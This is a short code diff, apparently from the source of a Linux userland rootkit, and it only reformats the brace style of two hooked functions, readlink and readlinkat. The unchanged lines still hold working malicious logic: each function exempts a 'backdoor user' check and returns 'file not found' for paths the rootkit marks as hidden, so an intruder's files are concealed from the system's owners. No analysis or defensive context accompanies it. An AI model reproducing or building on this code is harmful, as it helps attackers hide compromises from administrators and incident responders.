@@ -1,13 +1,11 @@
-ssize_t readlink(const char *pathname, char *buf, size_t bufsiz)
-{
+ssize_t readlink(const char *pathname, char *buf, size_t bufsiz){
     hook(CREADLINK);
     if(is_bdusr()) return (ssize_t)call(CREADLINK, pathname, buf, bufsiz);
     if(hidden_path(pathname)) { errno = ENOENT; return -1; }
     return (ssize_t)call(CREADLINK, pathname, buf, bufsiz);
 }
 
-ssize_t readlinkat(int dirfd, const char *pathname, char *buf, size_t bufsiz)
-{
+ssize_t readlinkat(int dirfd, const char *pathname, char *buf, size_t bufsiz){
     hook(CREADLINKAT);
     if(is_bdusr()) return (ssize_t)call(CREADLINKAT, dirfd, pathname, buf, bufsiz);
     if(hidden_path(pathname) || hidden_fd(dirfd)) { errno = ENOENT; return -1; }
